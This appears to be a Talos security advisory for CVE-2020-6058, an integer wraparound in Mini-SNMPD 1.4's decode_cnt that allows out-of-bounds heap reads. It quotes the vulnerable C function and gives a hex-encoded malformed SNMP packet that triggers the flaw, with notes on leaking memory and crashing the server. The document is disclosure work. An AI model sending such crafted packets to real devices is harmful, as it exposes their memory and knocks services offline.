# Talos Vulnerability Report

### TALOS-2020-0975

## Mini-SNMPD decode\_cnt information leak vulnerability

##### February 3, 2020

##### CVE Number

CVE-2020-6058

### Summary

An exploitable out-of-bounds read vulnerability exists in the way MiniSNMPD version 1.4 parses incoming SNMP packets. A specially crafted SNMP request can trigger an out-of-bounds memory read, which can result in the disclosure of sensitive information and denial of service. To trigger this vulnerability, an attacker needs to send a specially crafted packet to the vulnerable server.

### Tested Versions

Mini-SNMPD 1.4

### Product URLs

<https://troglobit.com/projects/mini-snmpd/>

### CVSSv3 Score

8.2 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:H

### CWE

CWE-190: Integer Overflow or Wraparound

### Details

Mini-SNMPD is a lightweight implementation of a Simple Network Management Protocol server. Its small code size and memory footprint make it especially suitable for small and embedded devices. It is used, for example, by several devices based on the OpenWRT project.

SNMP packets are described by ASN.1 specification and are encoded using BER encoding. In its most simplest form, these can be viewed as type-length-value fields. For this purpose, an SNMP packet parser implements a decoder for variable length integers. Decoding of unsigned integers is implemented in `decode_cnt` function in Mini-SNMPD:

```
static int decode_cnt(const unsigned char *packet, size_t size, size_t *pos, size_t len, uint32_t *value)
{
    if (*pos >= (size - len + 1)) {                         [1]
        lprintf(LOG_DEBUG, "underflow for unsigned\n");
        errno = EINVAL;
        return -1;
    }

    *value = 0;
    while (len--) {
        *value = (*value << 8) | packet[*pos];
        *pos = *pos + 1;                                    [2]
    }

    return 0;
}

```

In the above code, `pos` is an index to the current byte of the packet that is being decoded, `len` represents the previously decoded length of the unsigned integer to be decoded and `size` is the total size of the packet. The check at [1] tests if there are enough bytes left in the packet to properly decode the integer, but an integer overflow is possible if `len` value is bigger than `size` value. Since the check is dealing with `size_t` types, this can lead to integer wraparound. With a large value of `len` this check passes and a while loop is entered where `pos` index can be incremented past the ends of the memory allocated for this packet.

Function `decode_cnt` is called when parsing two parts of the SNMP packet, depending on the request type. Those are “error states or non-repeaters” and “error index or max repetitions”. To trigger this bug, following sample packet can be sent (with invalid integer size in both non-repeaters and max repetitions fields):

```
p = "30" # sequence
p+= "3f" + "020100" + "0406" # length of sequence, integer , octet string
p+= "41"*6 #community string
p+= "a1" # request type
p+= "32" # request length
p+= "02820004"  # int of 4
p+= "21a35f68" # req id
p+= "0282" # int with the "length of length" 2
p+= "001d" # length of int
p+= "0100301e301c0615" # padding
p+= "2b06010201060d010300000000838000" # padding
p+= "0000000000" # padding
p+= "0282" # int with the "length of length" 2
p+= "ffff" # length of int
p+= "00c000" # padding
p+= "3000" # padding

```

The above packet has two entries that specify “length of int” which will be used as `len` arguments to the `decode_cnt` function. If either of those lengths are bigger than the size of the packet, `decode_cnt` will read past the end of the packet resulting in undefined behavior. Function `decode_cnt` will collect values it reads out of bounds into its return variable `val` and by sending multiple packets with variable sizes arbitrary amounts of memory can be read four bytes at a time.

If Address Sanitizer is enabled, parsing of the above packet results in a following crash:

```

```

Memory for these packets comes from `client_t` structure which is allocated on the heap. To abuse this vulnerability, multiple malformed packets that would align in memory could be sent. Additionally, accessing out of bounds memory at a large offset can access a unallocated memory which would lead to access violation and immediate crash resulting in Denial Of Service.
